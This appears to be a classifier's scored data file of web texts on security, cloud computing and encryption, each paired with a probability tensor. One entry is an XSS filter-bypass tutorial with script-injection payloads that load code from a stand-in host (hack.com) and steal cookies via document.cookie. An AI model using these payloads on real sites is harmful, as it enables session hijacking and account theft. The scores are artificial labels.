itself. However, Trojans can carry viruses and other malicious software within them. Two specific types of Trojans are keyloggers and RATs: - A keylogger, or keystroke logger, captures all keystrokes and then records that information to a log file. With a keylogger, a hacker can capture your logins, passwords, credit card numbers, and any other confidential information that you type. Once collected, this information can be silently transmitted to the Trojan’s creator for malicious purposes, such as credit card or bank fraud. - A remote access Trojan (RAT) gives someone remote access to and control of a computer. With a RAT, imposters can send email messages that will appear to be from you; read, modify, or destroy your documents; and use your PC to attack and infect other computers. A computer virus is a software program designed to alter the operation of a computer. Most viruses are malicious and intended to cause damage, but even a benign virus can harm a system. Viruses can damage files, software programs, the registry, and Viruses are distributed in executable files, such as through email attachments, CDs, and Internet downloads. A virus infection occurs when the infected file is run. A virus also automatically replicates, or makes copies of itself, by secretly embedding its programming code into other programs. The term “virus” is often used as a generic, collective reference that includes other types of malicious programs, such as worms and Trojans. A computer worm is a software program designed to reproduce and spread among computers. Most worms are malicious and intended to overwhelm system memory or network bandwidth. Worms can crash an entire network of computers or an individual computer. Worms are generally distributed in email attachments or through unprotected Internet activity. A worm spreads very rapidly because it is self-contained. It replicates itself and, unlike viruses, a worm does not need to infect another program to spread.",
        "prob": "tensor([[0.0023, 0.9977]])"
    },
    {
        "text": "There are some explanations on what YubiKey does here. Basically, the password which the YubiKey \"types\" (from the point of view of the computer, it is a keyboard) can be either a static password, or a one-time password. If it is a static password, then you just revealed it, and it is time to be very sorry (and promptly change that password). The one-time passwords, what YubiKey produces follows HOTP. The cryptography in HOTP is such that it is not computationally feasible to recompute the \"master secret\" from one or several one-time passwords produced with HOTP. Moreover, each password is internally computed from a counter. The YubiKey and the server both maintain the same counter, and the server allows for some limited lack of synchronization. Namely, when the server's current counter has value n and receives a password as authentication attempt, it will internally generate the passwords for values n+1, n+2,... up to, say, n+100 (that's configurable). If a match is found with (say) password n+17, then access is granted and the server's counter is set to n+17; otherwise, connection is rejected and the server's counter is not changed. Therefore, what you inadvertently published \"on the Internet\" is a password which will grant access to the corresponding server, until your own next authentication on that server, because that authentication will update the server's counter to a further counter value. In a way, using OTP with counter value k invalidates all OTP values with values j < k. Which leads to the following recovery procedure: if you published an OTP value, quickly connect to the server so as to invalidate that published value. Afterwards, you can just ignore it; once invalidated, it is harmless. (Note: if you repeatedly generate a lot of \"blank\" passwords with your key without authenticating to the server, your YubiKey may go out of synch with that of the server -- the key using counter values way beyond what the server would currently accept. Don't let your 3-year-old play with your YubiKey ! In a similar situation, for infrared car keys, counter synchronization is forced through RFID when you start the engine.)",
        "prob": "tensor([[7.6698e-04, 9.9923e-01]])"
    },
    {
        "text": "The cloud computing revolution is real: it’s on the front page of the Australian Financial Review this morning. But is it really “a radical new business model that purports to slash technology costs by up to 80%”? What is cloud computing? Every business bigger than one person needs somewhere to store its data and run its business applications and communications, including email. A generation of businesses has installed a server — or many servers in a data centre — and hired specialist IT staff to run it. With cloud computing, you instead rent capacity in a provider’s data centre, and connect over the internet. The provider’s staff install, maintain and upgrade hardware and software as required. Typically you’ll rent a service, such as data storage or email or accounting, rather than ‘a server’ as such, and pay $X per user or $Y per business per month. Why is it called cloud computing? Network diagrams have traditionally used a cloud symbol to denote ‘the internet’ or, before that, the telephone network outside the customer’s zone of responsibility. What services are on offer? You name it. Google’s Gmail and Microsoft’s Windows Hotmail are email in the cloud. In the lucrative business productivity market, Google Docs and Google Apps compete directly with Microsoft Office and Exchange — the latter now ‘in the cloud’ as Microsoft Online Services. Accounting, customer relationship management (CRM), project management, email marketing, spam and virus filtering, data storage, ecommerce, online publishing, audio and video streaming, general databases — all available in the cloud. Why use cloud computing? Potentially cloud services are cheaper and more flexible. Because they’re internet-based, you can access them from anywhere — often including mobile devices. Most servers and internet links lie idle most of the time. Cloud providers host many businesses on a pool of hardware, sharing the cost of servers, electricity, data links, backup systems, IT staff and even real estate. A cloud provider can quickly add extra capacity or scale it back again when you need it. Capital expenditure on servers and up-front software licenses, and the unpredictable costs of dealing with emergencies, are replaced by a predictable operational cost. Can it really cut IT costs by 80%? That’s hype. Hardware and internet costs are dropping, sure, but supporting end users is still a significant cost. Moving to the cloud removes the cost of maintaining your own systems, but you still need to configure the generic cloud-based service to match your business’ unique needs, train your staff and help them find lost spreadsheets. Is there a downside? You become dependent on your cloud providers. If there’s no easy way to extract your data in a usable format, your business success is now intertwined with theirs. There may also be legal and privacy issues: will your data become subject to the privacy and data retention laws of another country; will you still be compliant with your industry requirements in Australia? Is it secure? Big cloud providers like Microsoft and Google have some of the best security staff on the planet. Their backup procedures are likely to be better than yours too. (Where are your business data backups right now?) However big cloud providers do represent an attractive target to hackers — if they can break in. Is cloud computing “radically new”? Not everyone thinks it’s that big a change. It’s more evolution than revolution. “Cloud computing is not only the future of computing, it is the present, and the entire past of computing is all cloud,” said Larry Ellison, founder of Oracle Corporation and the world’s sixth richest man, in a passionately entertaining rant last year. “It’s not water vapour. All it is is a computer attached to a network. What are you talking about? I mean, what do you think Google runs on?” As Ellison points out, CRM provider Salesforce.com has been running more than a decade. In many ways cloud computing is indeed just the current buzzword for what has also been called utility computing, grid computing, software as a service (SaaS), IBM’s ‘On Demand’ branded services, the application service provider (ASP) model, or even good ol’ mainframe timesharing. Where is Australia in all this? Some big companies have committed to cloud computing, including the Commonwealth Bank, Westpac, Visy and Komatsu. The Royal Australian College of General Practice will provide GPs with cloud-based e-health applications by this time next year. Even the Department of Defence’s CIO is advocating the cloud. On the supply side, Telstra is investing heavily to become a player — they’re providing the RACGP’s services. Saasu and Campaign Monitor are Australian success stories in cloud-based accounting and email marketing respectively. Cloud computing does require solid internet links, however. Australia’s relatively expensive broadband infrastructure may have held back adoption. The NBN will presumably fix this.",
        "prob": "tensor([[2.0551e-06, 1.0000e+00]])"
    },
    {
        "text": "Virtualization, in computer science, is a virtual (or real) of something, such as hardware platform, operating system, storage device or network resources. Virtualization can be seen as part of the largely expansion of enterprise IT that includes autonomic computing, a scenario in which the IT environment can be managed on the basis of perceived activity, and utility computing, where you see the processing power of computers utility customers to pay only when necessary. The usual goal of virtualization is to centralize administrative tasks and improve the scalability and workload. Virtualization within IT is not a new phenomenon; in fact, it has been a way to reduce IT costs in the industry in one form or another for nearly 20 years. The main difference now is the wide range of virtualization technologies available and how these can be implemented to achieve differing business objectives. Because virtualization can introduce flexibility to an IT estate and bring with it a wide range of benefits, IT organizations often lose focus on the benefits they are looking for and concentrate on delivering to those needs. No single item in an IT budget is going to have the procurement impact of the mainframe of yesteryear, and as such, far more work needs to be done to quantify the benefits Virtualization can increase the capacity of the data centre, reduce hardware support costs, bring electricity bills within digestible limits and even increase performance by removing aged architecture from your estate. The creation and popularity of mobile devices in the market today has seen IT departments having to respond to user requests to connect everything from smart phones to tablets to their corporate environments. It is easy for the users to use the application, but difficult to choose. Virtualization is further divided as desktop virtualization and server virtualization. Server virtualization is the partitioning of a physical server into smaller virtual servers. In server virtualization the resources of the server itself are hidden, or masked, from users, and software is used to divide the physical server into multiple virtual environments, called virtual or private servers. Server virtualization has many benefits. For example, it lets each virtual server run its own operating system and each virtual server can also be autonomously, separately rebooted of one another. Server virtualization also reduces costs because less hardware is required so that alone saves business money. It also utilizes resources to the fullest so it can also save on operational costs (e.g. using a lower number of physical servers reduces hardware maintenance). Desktop virtualization – Many enterprise-level implementations of technology store the resultant “virtualized” desktop on a remote central server, instead of on the local storage of a remote client; thus, when users work from their local machine, all of the programs, applications, processes, and data used are kept on the server and run centrally. Desktop virtualization allows users to run operating system and execute applications from a Smartphone or a thin client which exceed the user hardware’s capability to run.Pin It",
        "prob": "tensor([[0.1676, 0.8324]])"
    },
    {
        "text": "About Incorporating iCloud Into Your App iCloud is a free service that lets users access their personal content on all their devices—wirelessly and automatically via Apple ID. iCloud does this by combining network-based storage with dedicated APIs, supported by full integration with the operating system. Apple provides server infrastructure, backup, and user accounts, so you can focus on building great iCloud-enabled apps. The core idea behind iCloud is to eliminate explicit synchronization between devices. A user never needs to think about syncing and your app never interacts directly with iCloud servers. When you adopt iCloud storage APIs as described in this document, changes appear automatically on all the devices attached to an iCloud account. Your users get safe, consistent, and transparent access to their personal content everywhere. At a Glance iCloud is all about content, so your integration effort focuses on the model layer of your app. Because instances of your app running on a user’s other devices can change the local app instance’s data model, you design your app to handle such changes. You might also need to modify the user interface for presenting iCloud-based files and information. There is one important case for which Cocoa adopts iCloud for you. A document-based app for OS X v10.8 or later requires very little iCloud adoption work, thanks to the capabilities of the There are many different ways you can use iCloud storage, and a variety of technologies available to access it. This document introduces all the iCloud storage APIs and offers guidance in how to design your app in the context of iCloud. iCloud Supports User Workflows Adopting iCloud in your app lets your users begin a workflow on one device and finish it on another. Say you provide a podcast app. A commuter subscribes to a podcast on his iPhone and listens to the first twenty minutes on his way to work. At the office, he launches your app on his iPad. The episode automatically downloads and the play head advances to the point he was listening to. Or say you provide a drawing app for iOS and OS X. In the morning, an architect creates some sketches on her iPad while visiting a client. On returning to her studio, she launches your app on her iMac. All the new sketches are already there, waiting to be opened and worked on. To store state information for the podcast app in iCloud, you’d use iCloud key-value storage. To store the architectural drawings in iCloud, you’d use iCloud document storage. Three Kinds of iCloud Storage iCloud supports three kinds of storage. To pick the right one (or combination) for your app, make sure you understand the intent and capabilities of each. The three kinds of iCloud storage are: Key-value storage for discrete values, such as preferences, settings, and simple app state. Document storage for user-visible file-based information such as word processing documents, drawings, and complex app state. Core Data storage for shoebox-style apps and server-based, multi-device database solutions for structured content. iCloud Core Data storage is built on document storage and employs the same iCloud APIs. Prepare for iCloud with Provisioning and Entitlements The first two steps in adopting iCloud for your app are to obtain an appropriate provisioning profile for your development device and to request the appropriate entitlements in your Xcode project. Entitlements are key-value pairs that request capabilities for your app—such as the capability to use iCloud. Your iCloud entitlement values define where your app can place data and they ensure that only your apps are allowed to access that data. You request separate entitlements for document storage and key-value storage. When you code sign your app, these requests become part of your app’s code signature. How to Use This Document Whether you are developing for iOS, OS X, or both, and no matter which sort of app you are developing, start by reading the entire “iCloud Fundamentals” chapter to get the foundation that all iCloud developers need. Next, read “Designing for Key-Value Data in iCloud.” Any app that provides user settings or maintains user state—that is, nearly every app—should adopt iCloud key-value storage. The iOS and OS X document architectures automatically provide most of the iCloud functionality needed by document-based apps. If your app works with file-based information, you’ll want to read “Designing for Documents in iCloud.” If you are developing a Core Data app, read “Designing for Core Data in iCloud” for an overview of iCloud considerations for Core Data. No matter which iCloud storage APIs you adopt in your app, testing is critical. To get started on creating a test plan for your app, read “Testing and Debugging Your iCloud App.” This document describes the pieces you need to support iCloud in your app, but does not teach you how to develop apps. For that, start with Start Developing iOS Apps Today or Start Developing Mac Apps Today, and read the following documents: iOS apps: iOS App Programming Guide Mac apps: Mac App Programming Guide For a tutorial introduction to implementing a document-based iCloud app for iOS, read Your Third iOS App: iCloud. © 2012 Apple Inc. All Rights Reserved. (Last updated: 2012-09-19)",
        "prob": "tensor([[2.1475e-06, 1.0000e+00]])"
    },
    {
        "text": "As we continue this journey into the age of big data, cloud, mobility, social media and so forth, vast amounts of data are being generated daily. The volume of digital information continues to grow with no end in sight. More and more, personal and company information are becoming more and more digitized, both in storage and transfer. Securing this information is a growing challenge, and is becoming more complex by the day. Protecting digital assets means utilizing the best of available technologies and methodologies to achieve security goals. Not only must they ensure that the quality and performance of the solution is maintained, they must also assure undoubtedly that the information they seek to protect stays uncompromised. In the worlds of business and government, troves of information exist that are the focus of network security protection. Among the many different types, the data in question could be financial, medical, legal information, business intellectual property, and customer information. The vulnerability points could be numerous, and present points of weakness that emanate from such common elements such as a wi-fi network, dial-up, DMZ, Web Servers, VPN, USB drives – just to name a few. Organizations must therefore ensure they are monitoring all parts of their networks, and ensure they are using the best of security solutions that are deployed properly. Among the many things to consider are abilities such as administrator notification in the event of a breach and any related actions thereafter. Network monitoring manifests itself as a sustained operation, examining components of the network for information, failure, or performance. In the event of a failure, a notification is commonly configured. Depending on the environment this could range from alerting a system administrator, to logging an event in a knowledge base. Knowledge can be gleaned from a robust and well-integrated system by constantly analyzing performance, server outages, and any behavior that is out of the norm and varies from a baseline. Securing a network focuses on the effects of external threats to the network. Many organizations are under the direct influence of regulatory concerns; many others are targeted for attack by criminal and nefarious parties. Still other organizations may hold and protect valuable consumer and client data. A breach of such information could be significantly damaging to the reputation of an organization. The argument for proper and effective security cannot be dismissed in case after case, after case. There was a time when sophisticated network protection may have been an afterthought. Those days are long behind us. Take for example consumer focused services, copious amounts of information are increasingly put into cloud constructs, mobile technologies, across foreign networks, and many other elements that help complicate this picture. Customers expect their information is safe, secure, and free from prying eyes. Well publicized stories about identity theft, banking scams, and privacy have brought awareness to the general public. Though a brief example, when the concept is extended into confidential company information, or financial information, it is quite easy to extend the business-critical nature of network security into countless scenarios. A well-constructed network security system that is efficient in technical operation and accepted as a necessary policy are critical in today’s network and computing services. If you have not raised the criticality of security in your organization on par with other services your organization provides, then your organization could possibly face being quite behind in providing the best service possible and be on the wrong side of the risk. Accepting yesterday’s acceptable security in the ever-changing world of technology is a recipe for failure.",
        "prob": "tensor([[2.0570e-06, 1.0000e+00]])"
    },
    {
        "text": "There are several good ways to physically protect the data on laptops, netbooks, smart phones, personal data assistants (PDAs), memory sticks and other portable devices. Because these devices are small and generally not secured, it makes them especially susceptible to theft. Even if the data is protected and/or encrypted, theft of a portable device is nonetheless inconvenient and frustrating. In a worst-case scenario, the exposure of private and sensitive data could lead to serious consequences for a CPA firm. Portable devices with wireless capabilities are vulnerable to a wide range of potential attacks. Many devices are stronger than others when it comes to security. For example, Research in Motion (RIM), the company behind the BlackBerry, has made significant strides when it comes to smart phones and PDAs. Securing portable devices combines many different techniques. For example, you probably have one or more passwords that need to be entered before accessing data. Be smart and keep these in mind when using and creating passwords: - The Obvious — Create a strong password that you can easily remember and protect it from prying eyes. - Length and Complexity — Use at least 14 characters. The greater the variety of characters in your password, the better. Use the entire keyboard, not just the letters and characters you use or see most often. - Avoid — Dictionary words in any language; words spelled backwards, common misspellings and abbreviations; sequences or repeated characters; using personal information. - Test Your Password — Try www.microsoft.com/protect/fraud/passwords/checker.aspx. Microsoft offers some good guidance on creating strong passwords. Store Data in Different Places Don’t put all of your eggs in one basket. Never, ever allow your portable device to be the sole storage location of confidential or sensitive data. Consider storing data in separate locations. There are a number of storage mediums available that can be used for this purpose. External storage devices, like network area storage (NAS) boxes, are ideal. A reasonably sized NAS box can be purchased for under $200. In addition to storing data in different places, a NAS box works extremely well for frequent and timed backups of portable devices. This helps to guarantee availability of data if the portable device is lost or stolen. Encrypt Your Files Encryption helps ensure that unauthorized parties cannot access confidential and sensitive data, even if they have physical access to the portable device. Full disk encryption on laptops and netbooks is a must when such machines are used on engagements and may contain confidential and private client data. This technology prevents an intruder from starting a portable device without a password or biometric swipe. Laptops, netbooks and PDAs should receive the same level of security as your office desktop computer. Viruses are very common on the Internet and could potentially cause significant damage if your device is not protected. Take the protection one step further by implementing a solution that defends against other threats, such as malware. A firewall is an essential component in portable data protection. This mechanism monitors inbound and outbound traffic and also offers protection when you’re traveling. When using your laptop or netbook in a public space, you will frequently encounter various available networks. While some of them will enable you to securely access the Internet, others will appear to allow Internet access but covertly capture activity that may be passed through the connection. A firewall will help to detect the intrusion and automatically block these efforts. Ask yourself, “Is it really necessary that I transport this sensitive information?” If the answer is no, then don’t put the sensitive information on the portable device. In addition to the aforementioned measures, deploying and training your staff on portable-device-security best practices will also help protect confidential and private data. Understand how your portable device works. Read all of the instructions. New portable devices have more features, which means that you will have more of a learning curve to be able to understand and use these items properly. Default settings are often the least secure for devices as everyone with that same device will have the identical default settings. Keep Up With Patches If the device is a laptop, netbook or PDA, keep the patches current. Most vendors provide simple notification and update procedures (e.g., Microsoft Windows Update). If the device is a BlackBerry or other device with a proprietary operating system, make sure that the operating system is updated frequently. Don’t assume that just because you are deploying new portable devices that they have current patches installed. Often, devices are produced months before they are sold and initial operating systems have since been updated. Disable Unused Access Methods If you have a portable device equipped with a wireless card and that card is not being used, turn it off. Lock the portable device when not being used or when the device is being placed somewhere outside of your control. Whenever using mobile data, always consider, “What could happen if an unauthorized person gained control of this information?” Look for and try to use the most secure methods for handling data. Vendors are a good source of data. Visit their websites for additional information. |Rate this article 5 (excellent) to 1 (poor). Send your responses here James C. Bourke, CPA.CITP, CFF, is a partner at WithumSmith+Brown and also the director of Firm Technology. He is a past president of the New Jersey Society of CPAs and currently serves on AICPA Council and chairs the AICPA CITP Credential Committee. He was recently named one of the Top 100 Most Influential People in the profession.",
        "prob": "tensor([[2.0731e-06, 1.0000e+00]])"
    },
    {
        "text": "Hello friends. These days I am on an XSS rampage. I recently posted an article on XSS vulnerability in Babylon search. Since then I got several request from the readers to post a quick article on cross site scriptting. This tutorial will be divided into two parts. In the first part I will cover the basics of XSS and how the attack vector is implemented. In the next tutorial we will discuss some techniques by which we can prevent XSS attacks. OWASP lists sql injection and XSS as the two most common vulnerabilities in web pages and web apps. We have covered SQL injection quiet extensively so I decided to write on xss. Cross Site Scripting or XSS is a web application attack that involves injecting a piece of malicious code into the vulnerable web application/web page. The attacker injects a client side script mainly through the web browser to reach the other users of the particular website. This attack can open several doors for the attacker ranging from session hijacking to entire database compromise. Reflected or Non-persistent XSS attack This is the most common form of XSS attack in which the attackers crafts a malicious code and transfers it to the server side either through the HTTP request parameter or through some HTML form submission. A simple Reflected XSS attack looks like this- <script>alert(‘xss’);</script> (Embedded Script) <script src=http://hack.com/xss.js></script> (External script) Consider this real time example of reflected XSS in action: Stored or Persistent XSS attack This attack is more dangerous and complicated compared to reflected XSS attack. In Stored or persistent XSS attack, the vulnerable script is stored on the target server and is activated once another user clicks on it. For example, consider a forum where the attacker posts a message containing a link to malicious script. Another user when views the message and clicks it, then the script activates and causes respective attack. The attacker can craft a malicious script like a cookie stealing script of the form <script>alert(document.cookie);</script> and steal victims cookies to perform session hijacking. DOM based XSS attack Consider the following piece of code: var loc = document.location + '?gotoHomepage=1'; document.write('<a href=\"' + loc + '\">Home</a>'); Complete Cheat Sheet on XSS: Bypassing Xss Simple Filteration Without Alteration: Now we notice, the above script we used for filtration is evolving only a few strings, knowing there are bunch of ways and strings to inject a malicious request. It's only filtering '< > /' means leaving hackers with a vast amount of other strings to inject a malicious code. This will generate an alert box again on a vulnerable server. This will too generate an alert box on a vulnerable server. Bypassing Advance Xss Filtration: Some webmasters filter lot more than this, especially it's filtered on important sites like gov and org sites. There's nothing impossible, we will try to get as much info about the filtration as much we can. Supposing a server that have filtered all strings just more than common in a way that it reads the malicious string in the beginning or in the end to avoid and abort it, this of course can be bypassed too! An example can be likely so: The above script will bypass filtration for the server that reads the malicious string in the beginning. This will bypass filtration on server that reads whether in the beginning or in the end or at both ends! Mostly, this kind of filtration isn't common, so cant be of much use. Some webmasters also filter the word 'xss' so it's likely to use some other message for making an alert. This will bypass message filtration. Now we will study some more advance filtration bypass. Some webmasters just simply define a pattern of a cross-site scripting script that is possibly common. In this case, I will mention here the full array of strings to inject, bypassing the filtration. We will suppose injecting in a search form. victim.com/search.php?query=\"><script src='http://malicous js'</script> These are a few simple and advanced scripts that can be used to check for XSS vulnerability. There are several automatic tools available as well but I would recommend that you first learn the manual method so that you can clearly understand the attack vector. Later on you can switch to automatic tools. In case you know any other XSS script that is missing in this tutorial then you can add in the comment box and I will update it in this tutorial along with your name. Special Thanks : str0ke,USMAN,tushy,Hackman,shubham,Fix",
        "prob": "tensor([[2.0163e-06, 1.0000e+00]])"
    },
    {
        "text": "IP addresses, strings of numbers that identify computers on the Internet, should generally be regarded as personal information, the head of the European Union's group of data privacy regulators said Monday. Peter Scharr, Germany's data protection commissioner as well as head of the EU data privacy group, told a European Parliament hearing that when an IP, or internet protocol, address identifies an individual user, then it must be considered personal data. Scharr's team has been commissioned to report on Internet search engine providers such as Google, Microsoft, and Yahoo, and examine how their Internet privacy policies stack up against E.U. privacy law. Companies like Google disagree with his conclusion because knowing the IP address of a certain computer doesn't necessarily tell you who is on that computer at any moment. A point Scharr concedes as computers with Internet access at cafés, libraries, and offices are examples of computers with multiple users per IP address. However, \"WHOIS\" Web sites have popped up where a user can type in an IP address and receive the name of the person or company identified with it. The AP says if IP addresses become privileged personal data, this will have a far-ranging effect on how search engines record data. Google says it needs to store search queries and gather information on online activity to improve its search results and to provide advertisers with correct billing information that shows that genuine users are clicking on online ads. Internet \"click fraud\" can be tracked by showing that the same IP address is jumping repeatedly to the same ad. Advertisers pay for each time a different person views the ad, so dozens of views by the same person can rack up costs without giving the company the publicity it wanted. On the other side of the Atlantic, CRMDaily.com reports that the Federal Trade Commission's verdict on whether IP addresses constitute private, and thus protected, information is still out.",
        "prob": "tensor([[4.7247e-05, 9.9995e-01]])"
    },
    {
        "text": "November 26, 2012: March 8, 2011: Hacktivists are non-government organizations, or even individuals, who launch Internet based attacks in the name of a favorite cause. After Hamas declared war on Israel on November 15th, many Western hacktivists declared themselves allies of Hamas and launched attacks on Israel. Like Hamas, the hacktivists promptly began issuing press releases detailing their victories. But, like the Hamas claims, the hacktivist victories were illusions and fabrications. Despite over eight million attacks (nearly all of them automated) a day, the main targets (Israeli media, government, and military sites) were largely unscathed. The Israelis were prepared, because they have been under attack for a long time. Moslem attackers have not been skilled enough to do much, if any damage. While the many recent cyber attacks against Israel were in the name of Hamas and Gaza, few were from Arab countries. Most were from hackers living in the West. A major player in this attack was the hacktivist group Anonymous. While Wikileaks has shown some care in not revealing information that would get counter-terror operatives (or informants) killed, a similar operation, Anonymous, has not demonstrated any restraint. For example, in an effort to get other hackers to stop pursuing Wikileaks supporters, the Anonymous crew broke into the network of a firm that did counter-terrorism work (HBGary Federal) and put on the Internet emails revealing how hacking software was used to gain access to terrorist computers and communications. Among the more interesting items revealed was the widespread use of USB thumb drives to gain access to the terrorist computers. Another revelation described how laptop ExpressCard ports could be used as well. The techniques revealed are not rendered completely useless, just less effective. Islamic terror groups tend to attract the less educated and people who don't pay attention as much as they should. But for the sharper terrorists, life just got a little easier and safer. That was a wakeup call for many computer security and counter-intelligence business, demonstrating that the least vulnerability in their own computer security could be exploited by someone with some decent hacker skills. For over a decade Moslem hacktivists have been trying to muster an effective Cyber War capability. So far they have failed. Even before September 11, 2001, there were attempts to build an alliance of anti-U.S., anti-Israel, and anti-India hackers who could pool their efforts to achieve a more significant impact. While there were more attacks against U.S. and Israeli web sites after September 11, 2001, these two nations contained the world's largest concentration (per capita) of Internet talent and were not very vulnerable to attack. Major commercial and government operations in both these nations have also been taking computer security more seriously since September 11, 2001, which has also made it harder for the casual (often an anti-social teenage male) hacker to make much of an impression. But the threat is still there (as detected by monitoring chat rooms, email, and other sources) and is taken seriously. Some groups, however, operate openly (more or less). These groups call themselves hacktivists (activists who use low level hacking to publicize their positions). A decade ago there were three hacktivist groups prominent in backing the Dark Side in the War on Terrorism: USG (Unix Security Guards), an anti-Israel alliance that claimed responsibility for many known attacks against Israeli sites, WFD (World's Fantabulous Defacers), an alliance of 12 Pakistani hacker groups that claimed (or was blamed) responsibility for hundreds of attacks (mainly against Indian sites) between November 2000 and September 11, 2001, and AIC (Anti-India Crew) another Pakistani hacker alliance that also claimed to have made hundreds of attacks against India. Nothing much came of these three groups or the equally boastful successors. Note that Pakistan has a long history with software development and hacking. The first computer virus to spread worldwide (the Brain virus), was created in Pakistan by Pakistani programmers. If the Islamic world is going to recruit world class hackers for hacktivism or something more serious, the manpower was likely to come from Pakistan. But that never happened. Anyone in a Moslem country with hacker quality computer skills wants to monetize them, not risk death or life in prison supporting Islamic fanatics. Thus the Islamic terrorists have been dependent on Western hacktivists and not the most competent ones. The Islamic hactivists have an image problem, in that many of them have supported Islamic terrorist groups and urged everyone to kill infidels (non-Moslems). Since Islamic terrorists have proved more adept at killing fellow Moslems, you would think Islamic hacktivists would protest against this. Most have not and continue to ascribe the misdeeds of Islamic terrorists as part of a vast American and Israeli conspiracy. This attitude does not work when you are trying to create effective hacker tools either.",
        "prob": "tensor([[2.0025e-06, 1.0000e+00]])"
    },
    {
        "text": "This just had some basic tips in order to avoid malware issues. Most of it is common knowledge but just some key points: - Install anti-malware programs on the computer. More than one can be beneficial since different programs update at different times so one might not catch something that another would. Also, make sure they are always fully updated. - Use strong passwords. The article recommends passwords at least 14 characters long but even longer is better. Stronger passwords use upper and lowercase letters, non-alphabetic characters, and tend not to follow a recognizable pattern. - Don’t be tricked. Possibly the most important piece of information contained in the article had nothing to do with technology. If something online doesn’t seem safe, odds are that it isn’t and a good amount of the time things that do seem relatively safe can still contain malware. Knowing this, one of the most effective strategies is to distrust any unknown sites, downloads, or links and hopefully whatever anti-malware software is installed can filter out anything that might slip by.",
        "prob": "tensor([[3.2439e-06, 1.0000e+00]])"
    },
    {
        "text": "What are IM attacks? As computer security has improved, and users have gotten more savvy about not opening every attachment that lands in their in-boxes, hackers and virus writers have been recognizing and exploiting the opportunities presented by IM-based attacks, the numbers of which have risen sharply over the last years. On the rise Instant messaging clients like AOL Instant Messenger (AIM), Yahoo! Messenger, MSN Messenger, and the chat feature in Skype have all been targeted. And unlike the simple viruses of years past, the IM threats have evolved into multi-staged attacks that have the potential to cause significant harm to users' computers. Instant-messaging threats work much like e-mail ones, where malware is launched when the recipient clicks on an executable file attachment or on a hyperlink that then links through to a malicious website. Instead of being sent over e-mail, however, these threats are spread through IM chat sessions. IM Worms and spim An IM worm is self-replicating malware that spreads in IM networks. When an IM worm infects a PC, it locates the address book for the IM client, which is called a buddy list or contact list, and tries to send itself to all the infected person's contacts. Some IM worms use social engineering techniques to trick the recipient into accepting a message that contains the malicious code. Instant messenging software is also being used to deliver spam. Spam delivered through IM instead of e-mails is known as spim. The number of IM threats such as viruses, worms, and phishing scams has been steadily increasing over the years. In December 2007, over 18 new malicious code attacks over instant messaging (IM) networks were discovered, bringing the 2007 total to 346. In 2004 there were almost no IM attacks, and in 2006 the number was around 130. Nearly 20 percent of IM threats in 2007 were reported on the AOL Instant Messenger network, 45 percent on MSN Messenger and 20 percent on Yahoo! Messenger. 2007 also marked the first IM prosecution in the US, punishable by $1.75 million in fines and nearly 60 years in prison, against a computer security consultant for using illegal IM botnets to hijack PayPal accounts. Learn more about BullGuard Antivirus. Learn more about BullGuard Spamfilter.",
        "prob": "tensor([[2.1022e-06, 1.0000e+00]])"
    },
    {
        "text": "At the same time, organizations, particularly those in highly regulated sectors, find themselves subject to increasing amounts of pressure from auditors, regulators and customers to safeguard data storage from loss, theft and inappropriate access. The Payment Card Industry (PCI) Data Security Standard, which requires all payment card information to be encrypted, is one example of such regulation. When considering encryption, remember that it can be applied to data in-flight or data at-rest. Data in-flight refers to information encrypted when in transit from one point to another, for example over the local-area network (LAN) or wide-area network (WAN). Encryption of data at-rest occurs when information is stored on media such as disk or tape. Storage encryption is concerned with data at-rest rather than encryption of data in-flight, which is provided at the network layer and comes embedded in hardware from vendors such as Brocade and Cisco Systems. There are several ways to enable storage encryption: - Through encryption technology embedded in backup software - Via encryption appliances that plug into storage networks - Through ASICs located at the drive level - In encryption software applied to devices and removable media Here's a quick overview of the pros and cons of each of these options.Encryption technology embedded in backup software The functionality required to encrypt data backups is incorporated into most backup software products. The advantage of undertaking encryption in this way is that it's possible to switch on encryption functionality without the need to change device drivers or drive settings, which makes it a cost-effective option for retrofitting to existing infrastructures. But there are disadvantages. Encryption software can generate throughput bottlenecks because data encrypted as it passes between the LAN and the storage infrastructure will incur a processing overhead. Encryption appliances that plug into storage networks Encryption appliances provide a relatively quick and easy means of retrofitting encryption capabilities onto existing systems because they plug directly into the fabric/network. They're best suited to large shared storage environments with bulk data encryption requirements because deploying multiple devices across the organisation can become an expensive proposition. These devices generate low performance overheads on the storage infrastructure. But research firm Gartner expects appliances to be superseded over the next three to five years as encryption functionality is increasingly included natively in storage systems. It's also worth bearing in mind that the reality of installing encryption appliances may not be quite as simple as vendors promise and can require third-party help. Key vendors in this space include CipherMax, CipherOptics, Crossroads Systems, Digital Security International, Exar's Hifn Technology, NetApp, SafeNet's Ingrian and Vormetric. Encryption using ASICs located at the drive level ASIC chips for encryption purposes are embedded into everything from external hard drives and tape drives to storage arrays. All of the key primary storage and tape library vendors have gone down this route. The advantage of this approach is that the host system doesn't suffer any performance overhead when encryption and decryption activity take place. This is because software code is baked into the silicon of the chip. The downside is the cost involved if organisations want to retrofit or replace existing kit with the new technology, not least because it comes at a premium. Encryption software applied to devices, removable media The most common use case for encryption is to protect removable media such as laptops and portable drives, although encryption of backup tapes is becoming increasingly common. The focus on removable media is due to obvious concerns over safeguarding data when it leaves the enterprise as more people ship backup tapes offsite and use mobile equipment. The Britannia Building Society in Stoke-on-Trent is encrypting removable media and also performing some native database encryption. Laptop hard drives are encrypted and users are prompted for a password at power on. Without a password, the disk is unreadable, even if the hard drive is installed on another machine. USB ports are locked down by a piece of software on all PCs, which means there's no way to transfer data out of the company via USB devices that are unauthorised or insecure. If an encrypted USB stick is lost, the data is still safe. LTO-4 tapes have encryption capabilities that could be used if Britannia Building Society wanted to send them offsite. Dylan Mathias, Unix and storage manager at Britannia Building Society, declined to name the specific products used at his firm but said, \"All these technologies are designed to prevent the data from being read if the device involved falls into the wrong hands. You have to assume sooner or later you will lose one of these things. The hardware can easily be replaced; the loss of data cannot.\" Inhibitors to storage encryption technology Some of the major reasons why encryption technology isn't universally applied at the moment include the upfront purchasing costs often associated with encryption, and user concerns that encrypting and decrypting data can slow data throughput. Deploying encryption technology at the storage subsystem is only \"just beyond early adoption\" and is unlikely to move into the mainstream for another three to five years, according to Rene Millman, a senior research analyst at Gartner. One reason for this lack of uptake is that organisations often believe data held within the walls of the enterprise to be less vulnerable. For example, Britannia Building Society's Mathias isn't convinced about the need to encrypt at the array level. \"The theory behind it is that someone might steal an entire array, but you'd need a JCB to do that and it would be quite an achievement,\" he said. \"I can see the argument for encryption on portable devices and tape backups, but I'm not convinced of the need to encrypt the entire 